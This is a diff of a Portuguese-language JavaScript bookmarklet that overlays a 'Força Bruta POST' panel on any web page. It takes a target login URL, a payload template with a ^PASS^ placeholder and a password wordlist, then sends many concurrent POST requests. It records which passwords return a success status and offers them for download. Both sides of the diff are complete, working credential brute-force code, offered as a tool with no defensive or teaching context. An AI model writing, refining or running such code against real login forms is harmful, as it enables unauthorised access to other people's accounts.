@@ -1,104 +1,106 @@
 javascript:(function(){
-if(document.getElementById('xBF'))return;
-let d=document.createElement('div');
-d.id='xBF';
-d.style='position:fixed;top:30px;right:30px;z-index:999999;background:#1e1e1e;color:#f1f1f1;padding:16px;border-radius:10px;box-shadow:0 4px 22px #0009;font:13px sans-serif;max-width:440px;width:440px;';
-d.innerHTML=`
-  <div style="font-size:15px;font-weight:bold;margin-bottom:8px;color:#0ff;">
-    🚀 Brute Force POST Turbo++
-  </div>
+if(document.getElementById('xBFPro')) return;
 
-  <label style="font-weight:bold;display:block;margin-top:6px;">🌍 URL alvo:</label>
-  <input id="bfurl" placeholder="Ex: https://site.com/login (vazio = URL atual)" 
-    style="width:100%;margin:4px 0 10px;padding:6px;border-radius:6px;border:1px solid #444;background:#111;color:#0ff;font-family:monospace;">
+let d = document.createElement('div');
+d.id = 'xBFPro';
+d.style = 'position:fixed;top:20px;right:20px;z-index:999999;background:#1e1e1e;color:#f1f1f1;padding:20px;border-radius:12px;box-shadow:0 4px 24px #0009;font:14px sans-serif;width:480px;max-height:90vh;overflow:auto;';
+
+d.innerHTML = `
+  <div style="font-size:16px;font-weight:bold;margin-bottom:10px;color:#0ff;">🚀 Força Bruta POST Pro</div>
+
+  <label style="font-weight:bold;display:block;margin-top:6px;">🌐 URL alvo:</label>
+  <input id="bfProUrl" placeholder="Ex: https://site.com/login (vazio = atual)" style="width:100%;margin:4px 0 10px;padding:6px;border-radius:6px;border:1px solid #444;background:#111;color:#0ff;font-family:monospace;">
 
   <label style="font-weight:bold;display:block;margin-top:6px;">🔑 Payload:</label>
-  <textarea id="bfpl" placeholder="Exemplo: user=admin&pass=^PASS^" 
-    style="width:100%;margin:4px 0 10px;height:65px;padding:6px;border-radius:6px;border:1px solid #444;background:#111;color:#0f0;font-family:monospace;"></textarea>
+  <textarea id="bfProPayload" placeholder="Ex: user=admin&pass=^PASS^" style="width:100%;margin:4px 0 10px;height:70px;padding:6px;border-radius:6px;border:1px solid #444;background:#111;color:#0f0;font-family:monospace;"></textarea>
 
   <label style="font-weight:bold;display:block;margin-top:6px;">📂 Arquivo Wordlist (.txt):</label>
-  <input type="file" id="bffl" accept=".txt" 
-    style="display:block;margin:6px 0 12px;padding:6px;border-radius:6px;background:#222;border:1px solid #444;color:#fff;">
+  <input type="file" id="bfProFile" accept=".txt" style="display:block;margin:6px 0 12px;padding:6px;border-radius:6px;background:#222;border:1px solid #444;color:#fff;">
 
-  <label style="display:block;margin:6px 0;">
-    <input type="checkbox" id="bfck"> 🔄 Sem reload após sucesso
-  </label>
+  <label style="font-weight:bold;display:block;margin-top:6px;">⚡ Configurações:</label>
+  <input type="number" id="bfProThreads" value="10" min="1" max="100" style="width:60px;margin-right:8px;"> Threads simultâneas
+  <label><input type="checkbox" id="bfProNoReload"> Sem recarregar após sucesso</label>
 
   <div style="margin-top:10px;display:flex;gap:6px;flex-wrap:wrap;">
-    <button id="bfsend" style="flex:1;background:#28a745;border:none;border-radius:6px;padding:8px;color:#fff;font-weight:bold;cursor:pointer;">▶️ Iniciar</button>
-    <button id="bfdown" style="flex:1;background:#007bff;border:none;border-radius:6px;padding:8px;color:#fff;font-weight:bold;cursor:pointer;display:none;">⬇️ Resultados</button>
-    <button id="bfclose" style="background:#911;border:none;border-radius:6px;padding:8px 14px;color:#fff;font-weight:bold;cursor:pointer;">✖</button>
+    <button id="bfProStart" style="flex:1;background:#28a745;border:none;border-radius:6px;padding:10px;color:#fff;font-weight:bold;cursor:pointer;">▶️ Iniciar</button>
+    <button id="bfProDownload" style="flex:1;background:#007bff;border:none;border-radius:6px;padding:10px;color:#fff;font-weight:bold;cursor:pointer;display:none;">⬇️ Resultados</button>
+    <button id="bfProClose" style="background:#911;border:none;border-radius:6px;padding:10px 14px;color:#fff;font-weight:bold;cursor:pointer;">✖</button>
   </div>
 
-  <label style="font-weight:bold;display:block;margin:10px 0 4px;">📜 Log:</label>
-  <div id="bflog" style="background:#000;height:150px;overflow:auto;padding:8px;font-family:monospace;font-size:12px;line-height:1.4;border-radius:6px;border:1px solid #444;white-space:pre-wrap;">
-    (aguardando início...)
-  </div>
+  <label style="font-weight:bold;display:block;margin:10px 0 4px;">📜 Logs:</label>
+  <div id="bfProLog" style="background:#000;height:250px;overflow:auto;padding:10px;font-family:monospace;font-size:12px;line-height:1.4;border-radius:6px;border:1px solid #444;white-space:pre-wrap;">Aguardando início...</div>
 `;
 document.body.appendChild(d);
 
-let $=id=>document.getElementById(id);
-$('bfclose').onclick=()=>d.remove();
+let $ = id => document.getElementById(id);
+$('bfProClose').onclick = () => d.remove();
 
-let resultados=[];
-$('bfdown').onclick=()=>{
-  if(resultados.length===0){alert('Nenhum resultado para baixar!');return;}
-  let conteudo=resultados.join('\n');
-  let a=document.createElement('a');
-  a.href=URL.createObjectURL(new Blob([conteudo],{type:'text/plain'}));
-  a.download='bruteforce_resultados.txt';
+let resultados = [];
+$('bfProDownload').onclick = () => {
+  if(resultados.length===0){alert('Nenhum resultado!'); return;}
+  let content = resultados.join('\n');
+  let a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([content], {type:'text/plain'}));
+  a.download = 'bf_results.txt';
   a.click();
 };
 
-$('bfsend').onclick=()=>{
-  let p=$('bfpl').value.trim(),
-      f=$('bffl').files[0],
-      nr=$('bfck').checked,
-      u=$('bfurl').value.trim() || location.href;
-  if(!p||!f){alert('Preencha payload e selecione um arquivo!');return;}
-  resultados=[];
-  $('bfdown').style.display='none';
-  $('bflog').innerHTML='🚀 Iniciando...\nAlvo: '+u+'\n';
-  let reader=new FileReader();
-  reader.onload=()=>{
-    let lines=reader.result.split(/\r?\n/).filter(l=>l.trim());
-    let maxConc=50, idx=0, active=0;
-    function tentar(){
-      while(active<maxConc && idx<lines.length){
-        let pass=lines[idx++];
+$('bfProStart').onclick = () => {
+  let payload = $('bfProPayload').value.trim();
+  let file = $('bfProFile').files[0];
+  let threads = parseInt($('bfProThreads').value) || 10;
+  let noReload = $('bfProNoReload').checked;
+  let url = $('bfProUrl').value.trim() || location.href;
+
+  if(!payload || !file){alert('Preencha payload e selecione arquivo!'); return;}
+  
+  resultados = [];
+  $('bfProDownload').style.display='none';
+  $('bfProLog').innerText = `🚀 Iniciando...\nAlvo: ${url}\nThreads: ${threads}\n`;
+
+  let reader = new FileReader();
+  reader.onload = () => {
+    let lines = reader.result.split(/\r?\n/).filter(l => l.trim());
+    let idx = 0, active = 0;
+
+    const tryNext = () => {
+      while(active < threads && idx < lines.length){
+        let currentPass = lines[idx++];
         active++;
-        let fd=new URLSearchParams();
-        p.replace(/\^PASS\^/g,pass).split('&').forEach(s=>{
-          let a=s.split('=');
-          fd.append(decodeURIComponent(a[0]||''),decodeURIComponent(a[1]||''));
+        let fd = new URLSearchParams();
+        payload.replace(/\^PASS\^/g, currentPass).split('&').forEach(s=>{
+          let a = s.split('=');
+          fd.append(decodeURIComponent(a[0]||''), decodeURIComponent(a[1]||''));
         });
-        fetch(u,{method:'POST',body:fd,redirect:'manual'})
+
+        fetch(url, {method:'POST', body: fd, redirect:'manual'})
         .then(r=>{
-          let msg=`[${r.status}] ${r.statusText} → ${pass}`;
-          if(r.status>=200 && r.status<300){
-            msg="✅ SUCESSO "+msg;
-            resultados.push(`${u} | Payload: ${p.replace(/\^PASS\^/g,pass)} | Senha: ${pass}`);
-            $('bfdown').style.display='inline-block';
-            if(!nr) location.reload();
-          }else{
-            msg="❌ FALHA "+msg;
-          }
-          $('bflog').innerHTML+=msg+'\n';
-          active--;tentar();
-          $('bflog').scrollTop=$('bflog').scrollHeight;
+          let msg = `[${r.status}] ${r.statusText} → ${currentPass}`;
+          if(r.status >= 200 && r.status < 300){
+            msg = "✅ SUCESSO "+msg;
+            resultados.push(`${url} | Payload: ${payload.replace(/\^PASS\^/g,currentPass)} | Senha: ${currentPass}`);
+            $('bfProDownload').style.display='inline-block';
+            if(!noReload) location.reload();
+          } else msg = "❌ FALHA "+msg;
+
+          $('bfProLog').innerText += msg + '\n';
+          active--;
+          tryNext();
+          $('bfProLog').scrollTop = $('bfProLog').scrollHeight;
         })
         .catch(e=>{
-          $('bflog').innerHTML+=`⚠️ ERRO Fetch: ${e}\n`;
-          active--;tentar();
-          $('bflog').scrollTop=$('bflog').scrollHeight;
+          $('bfProLog').innerText += `⚠️ ERRO: ${e}\n`;
+          active--;
+          tryNext();
+          $('bfProLog').scrollTop = $('bfProLog').scrollHeight;
         });
       }
       if(idx>=lines.length && active===0){
-        $('bflog').innerHTML+='✅ Finalizado\n';
+        $('bfProLog').innerText += '✅ Finalizado\n';
       }
-    }
-    tentar();
+    };
+    tryNext();
   };
-  reader.readAsText(f);
+  reader.readAsText(file);
 };
 })();
